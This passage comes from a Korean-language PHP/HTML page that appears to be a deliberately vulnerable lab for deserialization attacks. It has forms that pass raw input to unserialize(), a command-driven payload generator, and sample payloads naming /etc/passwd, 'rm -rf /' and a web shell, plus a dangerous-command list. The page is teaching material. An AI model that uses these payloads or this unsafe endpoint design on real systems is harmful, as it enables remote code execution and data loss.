        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }
        
        input, select, textarea, button {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        
        textarea {
            resize: vertical;
            min-height: 100px;
            font-family: 'Courier New', monospace;
        }
        
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            transition: background-color 0.3s;
        }
        
        button:hover {
            background-color: #45a049;
        }
        
        .dangerous-btn {
            background-color: #f44336;
        }
        
        .dangerous-btn:hover {
            background-color: #da190b;
        }
        
        .safe-btn {
            background-color: #2196F3;
        }
        
        .safe-btn:hover {
            background-color: #1976D2;
        }
        
        .warning-btn {
            background-color: #FF9800;
        }
        
        .warning-btn:hover {
            background-color: #F57C00;
        }
        
        .vulnerable-output {
            background-color: #ffebee;
            border: 2px solid #f44336;
            color: #c62828;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
        }
        
        .safe-output {
            background-color: #e8f5e8;
            border: 2px solid #4caf50;
            color: #2e7d32;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
        }
        
        .info-output {
            background-color: #e3f2fd;
            border: 2px solid #2196f3;
            color: #1565c0;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
        }
        
        .error-output {
            background-color: #fff3e0;
            border: 2px solid #ff9800;
            color: #ef6c00;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
        }
        
        .alert-danger {
            color: #d32f2f !important;
            font-weight: bold;
        }
        
        .alert-success {
            color: #2e7d32 !important;
            font-weight: bold;
        }
        
        .alert-warning {
            color: #f57c00 !important;
            font-weight: bold;
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
        }
        
        .grid-3 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }
        
        pre {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 5px;
            padding: 15px;
            overflow-x: auto;
            white-space: pre-wrap;
            font-size: 13px;
        }
        
        code {
            background-color: #f8f9fa;
            padding: 2px 4px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        
        .payload-examples {
            background-color: #1a1a1a;
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            overflow-x: auto;
        }
        
        @media (max-width: 768px) {
            .grid, .grid-3 {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 Advanced Deserialization 취약점 테스트</h1>
        
        <div class="description">
            <h3>🎯 Advanced Deserialization 취약점이란?</h3>
            <p><strong>직렬화(Serialization)</strong>는 객체를 저장이나 전송이 가능한 형태로 변환하는 과정입니다. <strong>역직렬화(Deserialization)</strong>는 그 반대 과정으로, 이때 악의적인 데이터가 포함되면 원격 코드 실행(RCE)이 가능합니다.</p>
            
            <h4>🔍 다양한 언어별 직렬화 취약점:</h4>
            <ul>
                <li><strong>PHP:</strong> unserialize() - Magic Method 악용</li>
                <li><strong>Python:</strong> pickle - __reduce__ 메서드 악용</li>
                <li><strong>.NET:</strong> BinaryFormatter - Gadget Chain 공격</li>
                <li><strong>Java:</strong> ObjectInputStream - ysoserial 도구 활용</li>
                <li><strong>Node.js:</strong> node-serialize - Function constructor 악용</li>
                <li><strong>Ruby:</strong> Marshal - eval 기반 코드 실행</li>
            </ul>
            
            <p><strong>⚠️ 교육 목적:</strong> 이 테스트는 다양한 언어의 직렬화 취약점을 시뮬레이션합니다. 실제 운영 환경에서는 JSON 등 안전한 데이터 포맷을 사용하거나 적절한 검증을 수행해야 합니다.</p>
        </div>

        <div class="grid">
            <!-- PHP Object Injection -->
            <div class="test-section">
                <h3>🔓 PHP Object Injection</h3>
                <p>PHP unserialize() 함수의 취약점을 테스트합니다.</p>
                
                <form method="post">
                    <div class="form-group">
                        <label for="serialized_data">직렬화된 데이터 입력:</label>
                        <textarea name="serialized_data" id="serialized_data" placeholder='예: O:8:"stdClass":1:{s:4:"name";s:4:"test";}'><?php echo htmlspecialchars($_POST['serialized_data'] ?? 'O:8:"stdClass":2:{s:4:"name";s:4:"test";s:5:"value";i:123;}'); ?></textarea>
                    </div>
                    
                    <input type="hidden" name="action" value="php_unserialize">
                    <button type="submit" class="dangerous-btn">🔓 위험한 unserialize() 실행</button>
                </form>
                
                <form method="post" style="margin-top: 10px;">
                    <input type="hidden" name="action" value="php_safe">
                    <button type="submit" class="safe-btn">🔒 안전한 직렬화 비교</button>
                </form>
                
                <div style="margin-top: 15px;">
                    <h5>💀 악의적인 페이로드 예제:</h5>
                    <div class="payload-examples">
O:10:"EvilObject":1:{s:7:"command";s:6:"whoami";}
O:9:"FileRead":1:{s:4:"file";s:11:"/etc/passwd";}
O:11:"SystemShell":2:{s:3:"cmd";s:8:"rm -rf /";s:6:"target";s:4:"root";}
                    </div>
                </div>
            </div>

            <!-- Python Pickle -->
            <div class="test-section">
                <h3>🐍 Python Pickle 취약점</h3>
                <p>Python pickle 모듈의 __reduce__ 메서드 악용을 시뮬레이션합니다.</p>
                
                <form method="post">
                    <div class="form-group">
                        <label for="pickle_type">공격 시나리오 선택:</label>
                        <select name="pickle_type" id="pickle_type">
                            <option value="os_command">시스템 명령 실행</option>
                            <option value="file_read">민감 파일 읽기</option>
                            <option value="network_request">네트워크 요청</option>
                            <option value="memory_corruption">메모리 조작</option>
                        </select>
                    </div>
                    
                    <input type="hidden" name="action" value="python_pickle">
                    <button type="submit" class="dangerous-btn">🐍 Python Pickle 공격 시뮬레이션</button>
                </form>
            </div>
        </div>

        <div class="grid">
            <!-- .NET BinaryFormatter -->
            <div class="test-section">
                <h3>⚡ .NET BinaryFormatter 취약점</h3>
                <p>.NET BinaryFormatter와 ysoserial.net을 활용한 공격을 시뮬레이션합니다.</p>
                
                <form method="post">
                    <div class="form-group">
                        <label for="dotnet_type">공격 유형 선택:</label>
                        <select name="dotnet_type" id="dotnet_type">
                            <option value="type_confusion">Type Confusion 공격</option>
                            <option value="xml_serializer">XmlSerializer 우회</option>
                            <option value="data_contract">DataContractSerializer 공격</option>
                            <option value="soap_formatter">SoapFormatter 취약점</option>
                        </select>
                    </div>
                    
                    <input type="hidden" name="action" value="dotnet_binary">
                    <button type="submit" class="dangerous-btn">⚡ .NET 역직렬화 공격 시뮬레이션</button>
                </form>
            </div>

            <!-- Node.js Deserialization -->
            <div class="test-section">
                <h3>🟢 Node.js 직렬화 취약점</h3>
                <p>Node.js의 다양한 직렬화 라이브러리 취약점을 시뮬레이션합니다.</p>
                
                <form method="post">
                    <div class="form-group">
                        <label for="nodejs_type">취약점 유형 선택:</label>
                        <select name="nodejs_type" id="nodejs_type">
                            <option value="node_serialize">node-serialize 취약점</option>
                            <option value="serialize_javascript">serialize-javascript XSS</option>
                            <option value="funcster">funcster RCE</option>
                            <option value="cryo">cryo 프로토타입 오염</option>
                        </select>
                    </div>
                    
                    <input type="hidden" name="action" value="nodejs_deserialize">
                    <button type="submit" class="dangerous-btn">🟢 Node.js 공격 시뮬레이션</button>
                </form>
            </div>
        </div>

        <!-- 페이로드 생성기 -->
        <div class="test-section">
            <h3>⚠️ 악의적인 페이로드 생성기</h3>
            <p class="alert-danger"><strong>경고:</strong> 교육 목적으로만 사용하세요. 실제 시스템에 피해를 줄 수 있습니다!</p>
            
            <form method="post">
                <div class="grid-3">
                    <div class="form-group">
                        <label for="payload_type">페이로드 유형:</label>
                        <select name="payload_type" id="payload_type">
                            <option value="php_object_injection">PHP Object Injection</option>
                            <option value="java_ysoserial">Java ysoserial</option>
                            <option value="python_pickle_rce">Python Pickle RCE</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="command">실행할 명령어:</label>
                        <input type="text" name="command" id="command" value="whoami" placeholder="예: whoami, ls -la, calc.exe">
                    </div>
                    
                    <div class="form-group">
                        <label>&nbsp;</label>
                        <input type="hidden" name="action" value="generate_payload">
                        <button type="submit" class="warning-btn">⚠️ 페이로드 생성</button>
                    </div>
                </div>
            </form>
        </div>

        <!-- 결과 표시 -->
        <?php if ($result): ?>
            <div class="test-section">
                <h3>📋 테스트 결과</h3>
                <?php echo $result; ?>
            </div>
        <?php endif; ?>

        <!-- 보안 권장사항 -->
        <div class="test-section">
            <?php echo $deserializationTest->showSecurityRecommendations(); ?>
        </div>

        <!-- 추가 리소스 -->
        <div class="test-section">
            <h3>📚 참고 자료 및 도구</h3>
            <div class="info-output">
                <h4>🛠️ 보안 테스트 도구:</h4>
                <ul>
                    <li><strong>ysoserial:</strong> Java 직렬화 익스플로잇 도구</li>
                    <li><strong>ysoserial.net:</strong> .NET 직렬화 익스플로잇 도구</li>
                    <li><strong>phpggc:</strong> PHP Generic Gadget Chains</li>
                    <li><strong>pickle-payload:</strong> Python Pickle 페이로드 생성기</li>
                    <li><strong>node-serialize exploit:</strong> Node.js 직렬화 익스플로잇</li>
                </ul>
                
                <h4>🔍 취약점 탐지:</h4>
                <ul>
                    <li><strong>Burp Suite:</strong> 웹 애플리케이션 보안 테스트</li>
                    <li><strong>OWASP ZAP:</strong> 웹 취약점 스캐너</li>
                    <li><strong>CodeQL:</strong> 정적 코드 분석</li>
                    <li><strong>Semgrep:</strong> 패턴 기반 코드 분석</li>
                </ul>
                
                <h4>📖 학습 자료:</h4>
                <ul>
                    <li><strong>OWASP Top 10:</strong> A08 - Software and Data Integrity Failures</li>
                    <li><strong>PortSwigger Web Security Academy:</strong> Deserialization 섹션</li>
                    <li><strong>SANS SEC542:</strong> Web Application Penetration Testing</li>
                    <li><strong>GitHub Security Lab:</strong> 직렬화 취약점 연구</li>
                </ul>
                
                <p class='alert-success'><strong>💡 추천:</strong> 실제 보안 테스트 시에는 반드시 격리된 환경에서 수행하고, 적절한 권한과 승인을 받은 후 진행하세요.</p>
            </div>
        </div>
    </div>

    <script>
        // 페이로드 예제 자동 채우기
        function fillExamplePayload(type) {
            const textarea = document.getElementById('serialized_data');
            const examples = {
                'basic': 'O:8:"stdClass":2:{s:4:"name";s:4:"test";s:5:"value";i:123;}',
                'evil': 'O:10:"EvilObject":1:{s:7:"command";s:6:"whoami";}',
                'file': 'O:8:"FileRead":1:{s:4:"file";s:11:"/etc/passwd";}',
                'shell': 'O:9:"WebShell":2:{s:3:"cmd";s:2:"id";s:6:"target";s:4:"root";}'
            };
            
            if (examples[type]) {
                textarea.value = examples[type];
            }
        }
        
        // 위험한 버튼 클릭 시 확인
        document.querySelectorAll('.dangerous-btn').forEach(button => {
            button.addEventListener('click', function(e) {
                if (!confirm('⚠️ 이 작업은 실제로 시스템에 영향을 줄 수 있습니다. 계속하시겠습니까?')) {
                    e.preventDefault();
                }
            });
        });
        
        // 페이로드 생성기 명령어 검증
        document.getElementById('command').addEventListener('input', function(e) {
            const dangerous_commands = ['rm -rf', 'format', 'del /f', 'shutdown'];
            const value = e.target.value.toLowerCase();
            
            for (let cmd of dangerous_commands) {
                if (value.includes(cmd)) {
                    e.target.style.borderColor = '#f44336';
                    e.target.style.backgroundColor = '#ffebee';
                    return;
                }
            }
            
            e.target.style.borderColor = '#ddd';
            e.target.style.backgroundColor = 'white';
        });
    </script>
</body>
</html>